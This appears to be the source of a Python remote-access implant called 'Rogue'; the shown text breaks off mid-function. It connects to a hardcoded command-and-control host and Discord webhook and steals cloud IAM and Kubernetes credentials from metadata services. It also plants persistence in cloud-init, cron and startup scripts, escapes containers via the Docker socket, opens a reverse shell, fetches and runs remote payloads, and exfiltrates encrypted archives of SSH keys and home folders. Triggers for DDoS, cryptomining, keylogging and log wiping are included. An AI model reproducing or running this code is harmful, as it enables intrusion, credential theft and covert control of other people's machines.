#!/usr/bin/env python3
import socket, subprocess, base64, time, urllib.request, os, threading, sys
from Cryptodome.Cipher import AES
import zipfile, tempfile, shutil, json
import urllib.parse
import ssl
import hashlib
import re
from urllib.request import Request, urlopen

# === Config ===
SECRET_KEY = b'6767BabyROGUE!&%5'
EXFIL_KEY = b'magicRogueSEE!333'
C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'
C2_PORT = 4444
EXFIL_PORT = 9091
PAYLOAD_REPO = "https://inadvertent-homographical-method.ngrok-tree.dev/payloads/"
HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
os.makedirs(HIDDEN_DIR, exist_ok=True)

# Implant unique identifier
IMPLANT_ID = f"{os.uname().nodename}_{os.getlogin()}_{os.getpid()}"
IMPLANT_ID_HASH = hashlib.md5(IMPLANT_ID.encode()).hexdigest()[:8]

# === Discord Fallback (Optional) ===
DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/1324352009928376462688/messages?limit=1"
DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/138892227736354441388/rVwymNWwbqkXxxhhHU76KUcM3Pa0BZ01hzY0rts14EoI15GW21rRgEEaqH82FhJE"
BOT_TOKEN = "MTM4ODk4Mmnru^&676hhbzOTkyNTQ5OA.G7d-oM.T2IM_m_GcgH5z76GBFuuc53782jdhfdiI8GeS8U"

# SSL context for ngrok
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# === CLOUD AWARE IMPLANT ===
class CloudAwareImplant:
    def __init__(self):
        self.cloud_info = None
        self.cloud_tactics = None
        
    def detect_environment(self):
        """Detect and adapt to cloud environment"""
        self.cloud_info = self._quick_cloud_detect()
        
        if self.cloud_info.get('is_cloud'):
            self.cloud_tactics = self._get_recommended_tactics()
            
            # Log cloud detection
            cloud_log = {
                'timestamp': time.time(),
                'cloud_info': self.cloud_info,
                'implant_id': IMPLANT_ID_HASH
            }
            
            cloud_log_path = os.path.join(HIDDEN_DIR, "cloud_detection.json")
            with open(cloud_log_path, 'w') as f:
                json.dump(cloud_log, f, indent=2)
        
        return self.cloud_info
    
    def _quick_cloud_detect(self):
        """Quick cloud detection without loading full detector"""
        detectors = [
            self._check_aws,
            self._check_azure,
            self._check_gcp,
            self._check_docker,
            self._check_kubernetes,
            self._check_container,
        ]
        
        for detector in detectors:
            result = detector()
            if result:
                return result
        
        return {'provider': 'unknown', 'is_cloud': False, 'type': 'baremetal'}
    
    def _check_aws(self):
        """Check for AWS"""
        try:
            # Try AWS metadata service
            req = Request("http://169.254.169.254/latest/meta-data/")
            req.add_header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
            
            # Try to get token for IMDSv2
            try:
                token_req = Request("http://169.254.169.254/latest/api/token")
                token_req.add_header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
                token_req.method = "PUT"
                token = urlopen(token_req, timeout=2).read().decode()
                req.add_header("X-aws-ec2-metadata-token", token)
            except:
                pass
            
            urlopen(req, timeout=2)
            return {'provider': 'aws', 'is_cloud': True, 'type': 'vm'}
        except:
            # Check system files
            if os.path.exists('/sys/hypervisor/uuid'):
                with open('/sys/hypervisor/uuid', 'r') as f:
                    if f.read().startswith('ec2'):
                        return {'provider': 'aws', 'is_cloud': True, 'type': 'vm'}
            
            aws_indicators = [
                '/sys/devices/virtual/dmi/id/product_name',
                '/sys/devices/virtual/dmi/id/bios_version',
                '/sys/class/dmi/id/chassis_vendor',
            ]
            
            for indicator in aws_indicators:
                if os.path.exists(indicator):
                    with open(indicator, 'r') as f:
                        if 'amazon' in f.read().lower():
                            return {'provider': 'aws', 'is_cloud': True, 'type': 'vm'}
        return None
    
    def _check_azure(self):
        """Check for Azure"""
        try:
            req = Request("http://169.254.169.254/metadata/instance?api-version=2021-02-01")
            req.add_header("Metadata", "true")
            urlopen(req, timeout=2)
            return {'provider': 'azure', 'is_cloud': True, 'type': 'vm'}
        except:
            # Check for Azure-specific files
            azure_indicators = [
                '/sys/class/dmi/id/chassis_asset_tag',
                '/sys/class/dmi/id/sys_vendor',
                '/var/lib/cloud/instance/datasource',
            ]
            
            for indicator in azure_indicators:
                if os.path.exists(indicator):
                    with open(indicator, 'r') as f:
                        content = f.read().lower()
                        if 'microsoft' in content or 'azure' in content or '7783-7084-3265-9085-8269-3286-77' in content:
                            return {'provider': 'azure', 'is_cloud': True, 'type': 'vm'}
        return None
    
    def _check_gcp(self):
        """Check for Google Cloud Platform"""
        try:
            req = Request("http://metadata.google.internal/computeMetadata/v1/")
            req.add_header("Metadata-Flavor", "Google")
            urlopen(req, timeout=2)
            return {'provider': 'gcp', 'is_cloud': True, 'type': 'vm'}
        except:
            # Check for GCP indicators
            gcp_indicators = [
                '/sys/class/dmi/id/product_name',
                '/sys/class/dmi/id/sys_vendor',
                '/var/lib/cloud/instance/datasource',
            ]
            
            for indicator in gcp_indicators:
                if os.path.exists(indicator):
                    with open(indicator, 'r') as f:
                        if 'google' in f.read().lower():
                            return {'provider': 'gcp', 'is_cloud': True, 'type': 'vm'}
        return None
    
    def _check_docker(self):
        """Check for Docker"""
        if os.path.exists('/.dockerenv'):
            return {'provider': 'docker', 'is_cloud': True, 'type': 'container'}
        
        if os.path.exists('/proc/1/cgroup'):
            with open('/proc/1/cgroup', 'r') as f:
                if 'docker' in f.read():
                    return {'provider': 'docker', 'is_cloud': True, 'type': 'container'}
        return None
    
    def _check_kubernetes(self):
        """Check for Kubernetes"""
        if os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount'):
            return {'provider': 'kubernetes', 'is_cloud': True, 'type': 'container'}
        
        env_vars = ['KUBERNETES_SERVICE_HOST', 'KUBERNETES_SERVICE_PORT']
        if any(var in os.environ for var in env_vars):
            return {'provider': 'kubernetes', 'is_cloud': True, 'type': 'container'}
        return None
    
    def _check_container(self):
        """Check for generic container"""
        if os.path.exists('/proc/1/cgroup'):
            with open('/proc/1/cgroup', 'r') as f:
                content = f.read()
                if any(indicator in content for indicator in ['containerd', 'crio', 'podman', 'kubepods']):
                    return {'provider': 'container', 'is_cloud': True, 'type': 'container'}
        return None
    
    def _get_recommended_tactics(self):
        """Get recommended tactics based on cloud environment"""
        tactics = {
            'persistence': [],
            'collection': [],
            'evasion': [],
            'payloads': [],
        }
        
        if not self.cloud_info:
            return tactics
        
        provider = self.cloud_info.get('provider')
        
        # Common cloud tactics
        tactics['persistence'].extend(['cloud_init_modification', 'cron_cloud_metadata'])
        tactics['collection'].extend(['cloud_metadata_collection', 'credential_harvesting'])
        tactics['evasion'].extend(['low_profile_beaconing', 'encrypted_storage'])
        
        # Provider-specific tactics
        if provider == 'aws':
            tactics['collection'].extend(['aws_credential_harvesting', 'aws_metadata_exfiltration'])
            tactics['payloads'].extend(['aws_credential_stealer.py', 's3_scanner.py'])
        
        elif provider == 'azure':
            tactics['collection'].extend(['azure_managed_identity_harvesting', 'azure_metadata_collection'])
            tactics['payloads'].extend(['azure_cred_harvester.py', 'key_vault_scanner.py'])
        
        elif provider == 'gcp':
            tactics['collection'].extend(['gcp_service_account_harvesting', 'gcp_metadata_collection'])
            tactics['payloads'].extend(['gcp_cred_harvester.py', 'gcp_bucket_scanner.py'])
        
        elif provider in ['docker', 'kubernetes', 'container']:
            tactics['persistence'].extend(['container_image_modification', 'kubernetes_cronjob'])
            tactics['collection'].extend(['container_breakout_attempt', 'kubernetes_secret_harvesting'])
            tactics['evasion'].extend(['container_fileless_execution', 'memory_only_persistence'])
            tactics['payloads'].extend(['container_escape.py', 'k8s_secret_stealer.py'])
        
        return tactics
    
    def adapt_hidden_dir(self):
        """Choose optimal hidden directory based on environment"""
        if not self.cloud_info or not self.cloud_info.get('is_cloud'):
            return HIDDEN_DIR
        
        provider = self.cloud_info.get('provider')
        
        if provider in ['docker', 'kubernetes', 'container']:
            # Containers: use ephemeral storage or bind mounts
            possible_locations = [
                '/tmp/.cache_systemd',
                '/dev/shm/.system_logs',
                '/run/.systemd',
                '/var/tmp/.log_cache',
            ]
        elif provider in ['aws', 'azure', 'gcp']:
            # Cloud VMs: use system directories that persist
            possible_locations = [
                '/var/lib/cloud/.cache',
                '/opt/.system_logs',
                '/usr/local/share/.cache',
                '/etc/.config_backup',
            ]
        else:
            return HIDDEN_DIR
        
        # Try locations
        for location in possible_locations:
            try:
                os.makedirs(location, exist_ok=True)
                # Test write
                test_file = os.path.join(location, '.test')
                with open(test_file, 'w') as f:
                    f.write('test')
                os.remove(test_file)
                return location
            except:
                continue
        
        return HIDDEN_DIR
    
    def adapt_persistence(self):
        """Adapt persistence mechanism for cloud"""
        if not self.cloud_info or not self.cloud_info.get('is_cloud'):
            return setup_persistence()  # Default
        
        provider = self.cloud_info.get('provider')
        
        if provider == 'aws':
            return self.setup_aws_persistence()
        elif provider == 'azure':
            return self.setup_azure_persistence()
        elif provider == 'gcp':
            return self.setup_gcp_persistence()
        elif provider in ['docker', 'kubernetes', 'container']:
            return self.setup_container_persistence()
        else:
            return setup_persistence()
    
    def setup_aws_persistence(self):
        """AWS-specific persistence"""
        print("[CLOUD] Setting up AWS-aware persistence")
        
        # 1. Cloud-init user-data modification
        cloud_init_paths = [
            '/etc/cloud/cloud.cfg',
            '/var/lib/cloud/instance/user-data.txt',
            '/var/lib/cloud/scripts/per-instance',
        ]
        
        for path in cloud_init_paths:
            if os.path.exists(path):
                try:
                    backup = f"{path}.backup"
                    shutil.copy(path, backup)
                    
                    with open(path, 'a') as f:
                        f.write(f"\n# AWS System Maintenance\n")
                        f.write(f"echo 'export ROGUE_LAUNCHED=1' >> /etc/profile\n")
                        f.write(f"(cd {HIDDEN_DIR} && nohup python3 rogue_implant.py >/dev/null 2>&1 &)\n")
                    
                    print(f"[+] Modified {path} for persistence")
                except Exception as e:
                    print(f"[-] Failed to modify {path}: {e}")
        
        # 2. Instance metadata cron job
        cron_cmd = f"0 * * * * root curl -s http://169.254.169.254/latest/meta-data/instance-id >/dev/null && cd {HIDDEN_DIR} && python3 rogue_implant.py &\n"
        
        cron_paths = ['/etc/cron.d/aws-monitor', '/etc/cron.hourly/aws-check']
        for path in cron_paths:
            try:
                with open(path, 'a') as f:
                    f.write(cron_cmd)
                print(f"[+] Added AWS cron persistence: {path}")
            except:
                pass
        
        return True
    
    def setup_azure_persistence(self):
        """Azure-specific persistence"""
        print("[CLOUD] Setting up Azure-aware persistence")
        
        # 1. Azure VM Agent extension
        waagent_dir = '/var/lib/waagent'
        if os.path.exists(waagent_dir):
            extension_dir = os.path.join(waagent_dir, 'custom-script')
            os.makedirs(extension_dir, exist_ok=True)
            
            extension_script = os.path.join(extension_dir, 'enable.sh')
            with open(extension_script, 'w') as f:
                f.write(f"""#!/bin/bash
# Azure Custom Script Extension
(cd {HIDDEN_DIR} && nohup python3 rogue_implant.py >/dev/null 2>&1 &)
""")
            os.chmod(extension_script, 0o755)
        
        # 2. cloud-init for Azure
        cloud_init_azure = '/etc/cloud/cloud.cfg.d/91-azure.cfg'
        os.makedirs(os.path.dirname(cloud_init_azure), exist_ok=True)
        
        with open(cloud_init_azure, 'a') as f:
            f.write(f"""
# Azure cloud-init extension
runcmd:
  - [bash, -c, "cd {HIDDEN_DIR} && nohup python3 rogue_implant.py >/dev/null 2>&1 &"]
""")
        
        return True
    
    def setup_gcp_persistence(self):
        """GCP-specific persistence"""
        print("[CLOUD] Setting up GCP-aware persistence")
        
        # 1. Google Cloud Startup Script
        startup_script = '/etc/google-cloud-startup-script'
        with open(startup_script, 'w') as f:
            f.write(f"""#!/bin/bash
# Google Cloud Startup Script
(cd {HIDDEN_DIR} && nohup python3 rogue_implant.py >/dev/null 2>&1 &)
""")
        os.chmod(startup_script, 0o755)
        
        # 2. cloud-init for GCP
        cloud_init_gcp = '/etc/cloud/cloud.cfg.d/90-gcp.cfg'
        os.makedirs(os.path.dirname(cloud_init_gcp), exist_ok=True)
        
        with open(cloud_init_gcp, 'a') as f:
            f.write(f"""
# GCP cloud-init configuration
bootcmd:
  - [bash, -c, "cd {HIDDEN_DIR} && python3 rogue_implant.py &"]
""")
        
        return True
    
    def setup_container_persistence(self):
        """Container-specific persistence"""
        print("[CLOUD] Setting up container-aware persistence")
        
        # 1. Docker socket access (if available)
        docker_socket = '/var/run/docker.sock'
        if os.path.exists(docker_socket):
            print("[+] Docker socket found - setting up container escape persistence")
            
            escape_script = os.path.join(HIDDEN_DIR, 'docker_escape.sh')
            with open(escape_script, 'w') as f:
                f.write(f"""#!/bin/bash
# Docker container escape persistence
DOCKER_HOST=unix:///var/run/docker.sock
# Mount host filesystem and install implant
docker run --rm -v /:/host alpine sh -c "
    cp {HIDDEN_DIR}/rogue_implant.py /host/tmp/ &&
    echo 'nohup python3 /tmp/rogue_implant.py &' >> /host/etc/profile
"
""")
            os.chmod(escape_script, 0o755)
        
        # 2. Memory-only persistence for containers
        mem_script = os.path.join(HIDDEN_DIR, 'memory_persistence.sh')
        with open(mem_script, 'w') as f:
            f.write(f"""#!/bin/bash
# Memory-only persistence for containers
IMPLANT_URL="{PAYLOAD_REPO}rogue_implant.py"

while true; do
    # Download implant to memory and execute
    curl -s $IMPLANT_URL | python3 -
    sleep 300
done
""")
        os.chmod(mem_script, 0o755)
        
        # Run memory persistence in background
        subprocess.Popen(['nohup', 'bash', mem_script, '&'], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        return True
    
    def fetch_cloud_payloads(self):
        """Fetch cloud-specific payloads"""
        if not self.cloud_info or not self.cloud_tactics:
            return []
        
        payloads = self.cloud_tactics.get('payloads', [])
        fetched = []
        
        for payload in payloads:
            if fetch_payload(payload):
                fetched.append(payload)
        
        if fetched:
            print(f"[CLOUD] Fetched {len(fetched)} cloud-specific payloads: {fetched}")
        
        return fetched
    
    def execute_cloud_recon(self):
        """Execute cloud-specific reconnaissance"""
        if not self.cloud_info or not self.cloud_info.get('is_cloud'):
            return "No cloud environment detected"
        
        provider = self.cloud_info.get('provider')
        results = []
        
        results.append(f"=== CLOUD RECONNAISSANCE: {provider.upper()} ===")
        results.append(f"\n[Cloud Environment]")
        results.append(f"Provider: {provider}")
        results.append(f"Type: {self.cloud_info.get('type', 'unknown')}")
        
        # Provider-specific recon
        if provider == 'aws':
            results.append(self.aws_recon())
        elif provider == 'azure':
            results.append(self.azure_recon())
        elif provider == 'gcp':
            results.append(self.gcp_recon())
        elif provider in ['docker', 'kubernetes', 'container']:
            results.append(self.container_recon())
        
        return "\n".join(results)
    
    def aws_recon(self):
        """AWS-specific reconnaissance"""
        results = []
        
        try:
            # Try to get AWS metadata
            endpoints = [
                ('Instance ID', 'instance-id'),
                ('Instance Type', 'instance-type'),
                ('Region', 'placement/availability-zone'),
                ('Public IP', 'public-ipv4'),
            ]
            
            for name, endpoint in endpoints:
                try:
                    req = Request(f"http://169.254.169.254/latest/meta-data/{endpoint}")
                    data = urlopen(req, timeout=2).read().decode()
                    results.append(f"{name}: {data}")
                except:
                    results.append(f"{name}: Not available")
            
            # Try to get IAM role
            try:
                req = Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
                role = urlopen(req, timeout=2).read().decode().strip()
                
                if role:
                    results.append(f"IAM Role: {role}")
                    cred_req = Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
                    cred_data = json.loads(urlopen(cred_req, timeout=2).read().decode())
                    results.append(f"Access Key: {cred_data.get('AccessKeyId')}")
                    results.append(f"Secret Key: {cred_data.get('SecretAccessKey')[:20]}...")
            except:
                pass
            
        except Exception as e:
            results.append(f"[!] AWS recon failed: {e}")
        
        return "\n".join(results)
    
    def azure_recon(self):
        """Azure-specific reconnaissance"""
        results = []
        
        try:
            # Get Azure metadata
            req = Request("http://169.254.169.254/metadata/instance?api-version=2021-02-01")
            req.add_header("Metadata", "true")
            
            response = urlopen(req, timeout=2)
            data = json.loads(response.read().decode())
            
            results.append("[Azure Metadata]")
            if 'compute' in data:
                compute = data['compute']
                results.append(f"VM ID: {compute.get('vmId')}")
                results.append(f"VM Size: {compute.get('vmSize')}")
                results.append(f"Location: {compute.get('location')}")
                results.append(f"Resource Group: {compute.get('resourceGroupName')}")
            
        except Exception as e:
            results.append(f"[!] Azure recon failed: {e}")
        
        return "\n".join(results)
    
    def gcp_recon(self):
        """GCP-specific reconnaissance"""
        results = []
        
        try:
            # Get GCP metadata
            endpoints = [
                ('Instance ID', 'instance/id'),
                ('Machine Type', 'instance/machine-type'),
                ('Zone', 'instance/zone'),
                ('Project ID', 'project/project-id'),
            ]
            
            results.append("[GCP Metadata]")
            for name, endpoint in endpoints:
                try:
                    req = Request(f"http://metadata.google.internal/computeMetadata/v1/{endpoint}")
                    req.add_header("Metadata-Flavor", "Google")
                    data = urlopen(req, timeout=2).read().decode()
                    results.append(f"{name}: {data}")
                except:
                    results.append(f"{name}: Not available")
            
        except Exception as e:
            results.append(f"[!] GCP recon failed: {e}")
        
        return "\n".join(results)
    
    def container_recon(self):
        """Container-specific reconnaissance"""
        results = []
        
        results.append("[Container Environment]")
        
        # Check Docker
        if os.path.exists('/.dockerenv'):
            results.append("Running in Docker container")
        
        # Check cgroups
        if os.path.exists('/proc/1/cgroup'):
            with open('/proc/1/cgroup', 'r') as f:
                results.append("\n[cgroups]")
                results.append(f.read()[:500] + "..." if len(f.read()) > 500 else f.read())
        
        # Check for Kubernetes
        if os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount'):
            results.append("\n[Kubernetes Environment]")
            try:
                with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
                    results.append(f"Namespace: {f.read().strip()}")
            except:
                pass
        
        return "\n".join(results)

# Initialize cloud awareness
cloud_implant = CloudAwareImplant()

# === ENHANCED SILENT MODE ===
def should_run_silently():
    """Check if we should run in silent mode - ONLY from persistence"""
    if os.environ.get('ROGUE_LAUNCHED') == '1':
        return True
    try:
        ppid = os.getppid()
        with open(f'/proc/{ppid}/cmdline', 'rb') as f:
            cmdline = f.read().decode('utf-8', errors='ignore').lower()
            if 'bash' in cmdline and ('rc' in cmdline or 'profile' in cmdline):
                return True
    except:
        pass
    return False

def redirect_output_to_log():
    """Redirect all output to log file for silent operation"""
    log_file = os.path.join(HIDDEN_DIR, ".implant.log")
    try:
        log_fd = open(log_file, 'a')
        sys.stdout = log_fd
        sys.stderr = log_fd
        return True
    except Exception as e:
        return False

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def send_https_command(cmd):
    """Send command over HTTPS to C2 - WITH DEBUG OUTPUT"""
    url = f"https://{C2_HOST}/"
    encrypted_cmd = encrypt_response(cmd)
    
    try:
        req = urllib.request.Request(
            url,
            data=encrypted_cmd,
            headers={
                'Content-Type': 'application/octet-stream',
                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                'X-Implant-ID': IMPLANT_ID_HASH
            },
            method='POST'
        )
        
        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
        encrypted_response = response.read()
        decrypted_response = decrypt_command(encrypted_response)
        return decrypted_response
    except Exception as e:
        error_msg = f"[!] Connection failed: {type(e).__name__}"
        if hasattr(e, 'reason'):
            error_msg += f" - {e.reason}"
        print(f"[DEBUG] Connection error: {e}")
        return error_msg

def fetch_payload(name):
    """Fetch payload from C2 server - WITH DEBUG"""
    url = f"{PAYLOAD_REPO}{name}"
    dest = os.path.join(HIDDEN_DIR, name)
    
    try:
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
                'X-Implant-ID': IMPLANT_ID_HASH
            }
        )
        
        response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
        
        with open(dest, 'wb') as f:
            f.write(response.read())
        
        if name.endswith('.py'):
            os.chmod(dest, 0o755)
        
        print(f"[+] Fetched payload: {name}")
        return dest
        
    except Exception as e:
        print(f"[!] Failed to fetch {name}: {e}")
        return None

def run_payload(name):
    path = os.path.join(HIDDEN_DIR, name)
    if os.path.exists(path):
        print(f"[+] Running payload: {name}")
        return subprocess.getoutput(f"python3 {path}")
    return f"[!] Payload {name} not found."

# === KUBERNETES SECRET STEALER HELPER FUNCTIONS ===

def trigger_k8s_steal():
    """Wrapper function for Rogue implant integration"""
    print("[+] Starting Kubernetes secret stealer...")
    
    # Download the payload if not present
    payload_path = fetch_payload("k8s_secret_stealer.py")
    if not payload_path:
        return "[!] Failed to download k8s_secret_stealer.py"
    
    # Run the payload
    try:
        result = subprocess.run(
            ["python3", payload_path, "--dump-all"],
            capture_output=True,
            text=True,
            timeout=300  # 5 minutes timeout
        )
        
        if result.returncode == 0:
            output = result.stdout
            
            # Extract output directory from results
            dir_match = re.search(r"Output directory: (.*?)\n", output)
            if dir_match:
                output_dir = dir_match.group(1)
                
                # Create summary
                summary = f"[+] Kubernetes secret stealing completed\n"
                summary += f"[+] Output directory: {output_dir}\n"
                
                # Count files
                file_count = 0
                for root, dirs, files in os.walk(output_dir):
                    file_count += len(files)
                
                summary += f"[+] Total files extracted: {file_count}\n"
                
                # Look for interesting files
                interesting_paths = [
                    os.path.join(output_dir, "tokens"),
                    os.path.join(output_dir, "certificates"),
                    os.path.join(output_dir, "ssh_keys"),
                ]
                
                for path in interesting_paths:
                    if os.path.exists(path):
                        count = len(os.listdir(path))
                        summary += f"[+] Found {count} items in {os.path.basename(path)}\n"
                
                return summary + "\n" + output[-1000:]  # Last 1000 chars of output
            else:
                return output[-2000:]  # Last 2000 chars if can't parse
        
        else:
            return f"[!] Kubernetes secret stealer failed:\n{result.stderr}"
    
    except subprocess.TimeoutExpired:
        return "[!] Kubernetes secret stealer timed out (5 minutes)"
    except Exception as e:
        return f"[!] Error running Kubernetes secret stealer: {e}"

def trigger_k8s_targeted(namespace=None, secret=None):
    """Targeted Kubernetes secret stealing"""
    if not namespace:
        return "[!] Usage: trigger_k8s_targeted <namespace> [secret_name]"
    
    print(f"[+] Starting targeted Kubernetes secret stealer for namespace: {namespace}")
    
    payload_path = fetch_payload("k8s_secret_stealer.py")
    if not payload_path:
        return "[!] Failed to download k8s_secret_stealer.py"
    
    try:
        cmd = ["python3", payload_path, "--target-namespace", namespace]
        if secret:
            cmd.extend(["--target-secret", secret])
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=120  # 2 minutes timeout
        )
        
        if result.returncode == 0:
            return f"[+] Targeted Kubernetes secret stealing completed\n{result.stdout[-1000:]}"
        else:
            return f"[!] Targeted stealing failed:\n{result.stderr}"
    
    except Exception as e:
        return f"[!] Error: {e}"

def zip_directory(path, zipf=None, base=""):
    if zipf is None:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
        should_close = True
    else:
        should_close = False

    if os.path.isdir(path):
        for root, _, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.join(base, os.path.relpath(full_path, path))
                zipf.write(full_path, arcname)
    elif os.path.isfile(path):
        zipf.write(path, arcname=os.path.join(base, os.path.basename(path)))

    if should_close:
        zipf.close()
        return zip_path

def encrypt_file(path):
    with open(path, 'rb') as f:
        plaintext = f.read()
    cipher = AES.new(EXFIL_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext

def exfiltrate_data(path):
    try:
        zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            if isinstance(path, list):
                for p in path:
                    zip_directory(p, zipf, base=os.path.basename(p))
            else:
                zip_directory(path, zipf)
        encrypted_blob = encrypt_file(zip_path)
        os.remove(zip_path)

        s = socket.socket()
        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
        s.connect((host, EXFIL_PORT))
        s.sendall(encrypted_blob)
        s.close()
        print(f"[+] Exfiltration successful: {path}")
        return f"[+] Exfiltrated encrypted archive from: {path}"
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")
        return f"[!] Exfiltration failed: {e}"

def reverse_shell():
    try:
        s = socket.socket()
        host = C2_HOST.split(":")[0] if ":" in C2_HOST else C2_HOST
        s.connect((host, 9001))
        while True:
            s.send(b"$ ")
            cmd = s.recv(1024).decode()
            if cmd.strip().lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
        s.close()
    except Exception as e:
        print(f"[!] Reverse shell failed: {e}")

def handle_trigger(cmd):
    # === CLOUD-AWARE TRIGGERS ===
    if cmd == "trigger_cloud_detect":
        """Detect cloud environment (full scan)"""
        fetch_payload("cloud_detector.py")
        return run_payload("cloud_detector.py")

    elif cmd == "trigger_cloud_recon":
        """Execute cloud reconnaissance"""
        return cloud_implant.execute_cloud_recon()

    elif cmd == "trigger_aws_creds":
        """AWS credential harvesting"""
        fetch_payload("aws_credential_stealer.py")
        return run_payload("aws_credential_stealer.py")

    elif cmd == "trigger_azure_creds":
        """Azure credential harvesting"""
        fetch_payload("azure_cred_harvester.py")
        return run_payload("azure_cred_harvester.py")

    elif cmd == "trigger_gcp_creds":
        """GCP credential harvesting"""
        fetch_payload("gcp_cred_harvester.py")
        return run_payload("gcp_cred_harvester.py")

    elif cmd == "trigger_container_escape":
        """Container escape attempt"""
        fetch_payload("container_escape.py")
        return run_payload("container_escape.py")

    elif cmd == "trigger_k8s_creds":
        """Kubernetes credential harvesting - Enhanced version"""
        return trigger_k8s_steal()

    elif cmd == "trigger_k8s_steal":
        """Kubernetes secret stealing (alias)"""
        return trigger_k8s_steal()
    
    elif cmd.startswith("trigger_k8s_target"):
        """Targeted Kubernetes secret stealing"""
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: trigger_k8s_target <namespace> [secret_name]"
        
        namespace = parts[1]
        secret = parts[2] if len(parts) > 2 else None
        
        return trigger_k8s_targeted(namespace, secret)

    # === EXISTING TRIGGERS ===
    elif cmd.startswith("trigger_ddos"):
        fetch_payload("ddos.py")
        path = os.path.join(HIDDEN_DIR, "ddos.py")
        args = " ".join(cmd.split()[1:])
        if os.path.exists(path):
            print(f"[+] Starting DDoS attack with args: {args}")
            return subprocess.getoutput(f"python3 {path} {args}")
        return "[!] ddos.py not found after download"

    elif cmd == "trigger_mine":
        fetch_payload("mine.py")
        print("[+] Starting crypto miner")
        return run_payload("mine.py")

    elif cmd == "trigger_stopmine":
        print("[+] Stopping crypto miner")
        return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")

    elif cmd.startswith("trigger_exfil"):
        parts = cmd.split()
        if len(parts) < 2:
            return "[!] Usage: trigger_exfil <path>"
        path = parts[1]
        print(f"[+] Starting exfiltration of: {path}")
        return exfiltrate_data(path)

    elif cmd == "trigger_dumpcreds":
        targets = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/.ssh"),
        ]
        existing_targets = [t for t in targets if os.path.exists(t)]
        if existing_targets:
            print(f"[+] Dumping credentials from {len(existing_targets)} locations")
            return exfiltrate_data(existing_targets)
        return "[!] No target directories found"

    elif cmd == "trigger_stealthinject":
        path = os.path.join(HIDDEN_DIR, "polyloader.py")
        if not os.path.exists(path):
            fetch_payload("polyloader.py")
        if os.path.exists(path):
            print("[+] Executing polyloader.py")
            return subprocess.getoutput(f"python3 {path}")
        return "[!] polyloader.py not found"

    # === NEW TRIGGERS FOR ENHANCED PAYLOAD SUITE ===
    
    elif cmd == "trigger_sysrecon":
        """Execute system reconnaissance"""
        fetch_payload("sysrecon.py")
        print("[+] Starting system reconnaissance")
        return run_payload("sysrecon.py")

    elif cmd == "trigger_linpeas":
        """Execute Linux privilege escalation check"""
        fetch_payload("linpeas_light.py")
        print("[+] Starting LinPEAS privilege escalation check")
        return run_payload("linpeas_light.py")

    elif cmd == "trigger_hashdump":
        """Dump password hashes"""
        fetch_payload("hashdump.py")
        print("[+] Starting password hash extraction")
        return run_payload("hashdump.py")

    elif cmd == "trigger_browsersteal":
        """Steal browser credentials and data"""
        fetch_payload("browserstealer.py")
        print("[+] Starting browser data extraction")
        return run_payload("browserstealer.py")

    elif cmd.startswith("trigger_keylogger"):
        """Start/stop keystroke logging"""
        parts = cmd.split()
        if len(parts) > 1 and parts[1] == "stop":
            print("[+] Stopping keylogger")
            return subprocess.getoutput("pgrep -f keylogger.py && pkill -f keylogger.py || echo '[-] No keylogger running.'")
        else:
            fetch_payload("keylogger.py")
            print("[+] Starting keystroke logger")
            # Start in background thread
            threading.Thread(target=lambda: run_payload("keylogger.py")).start()
            return "[*] Keylogger started in background"

    elif cmd.startswith("trigger_screenshot"):
        """Take screenshots"""
        parts = cmd.split()
        if len(parts) > 1 and parts[1] == "stop":
            print("[+] Stopping screenshot capture")
            return subprocess.getoutput("pgrep -f screenshot.py && pkill -f screenshot.py || echo '[-] No screenshot capture running.'")
        else:
            fetch_payload("screenshot.py")
            print("[+] Starting screenshot capture")
            # Start in background thread
            threading.Thread(target=lambda: run_payload("screenshot.py")).start()
            return "[*] Screenshot capture started in background"

    elif cmd.startswith("trigger_logclean"):
        """Clean system logs"""
        parts = cmd.split()
        if len(parts) > 1:
            fetch_payload("logcleaner.py")
            if parts[1] == "all":
                print("[+] Cleaning all logs")
